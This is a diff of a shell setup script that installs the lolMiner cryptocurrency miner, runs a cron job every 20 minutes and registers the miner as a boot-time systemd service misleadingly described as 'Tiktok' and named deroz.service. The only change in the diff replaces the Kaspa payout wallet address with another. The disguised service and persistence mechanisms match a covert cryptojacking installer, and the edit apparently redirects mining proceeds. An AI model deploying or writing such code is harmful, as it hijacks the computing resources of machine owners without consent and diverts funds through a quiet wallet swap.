@@ -17,7 +17,7 @@ sudo chmod +x /home/cron.sh
 sudo echo  '*/20 * * * * /home/cron.sh' | crontab -
 sudo wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.67/lolMiner_v1.67_Lin64.tar.gz
 sudo tar xvzf lolMiner_v1.67_Lin64.tar.gz
-sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/1.67/lolMiner --algo ETCHASH --pool eu.ezil.me:4444 --user 0xCEEC62a6274C569a7c8881bbA51faCDf6B6B0478.zil1v95pzrmxq3t2ythsv5dckf9c488ecpund5ktx9.3060ti --enablezilcache --dualmode KASPADUAL --dualpool pool.woolypooly.com:3113 --dualuser kaspa:qqtm9nkckjhn2gv3xrgwt2krxftcnctw0ax4qgmesmmr25rt5egfx926m4cm9.3080ti\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/1.67/lolMiner --algo ETCHASH --pool eu.ezil.me:4444 --user 0xCEEC62a6274C569a7c8881bbA51faCDf6B6B0478.zil1v95pzrmxq3t2ythsv5dckf9c488ecpund5ktx9.3060ti --enablezilcache --dualmode KASPADUAL --dualpool pool.woolypooly.com:3113 --dualuser kaspa:qp9rz85zkrz2ljusreur3jzcu7gz2tr70tdpmxcvzydwpmnlu4pj2wm0fynan.3080ti\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
 sudo systemctl daemon-reload
 sudo systemctl enable deroz.service
 echo "Setup completed!"
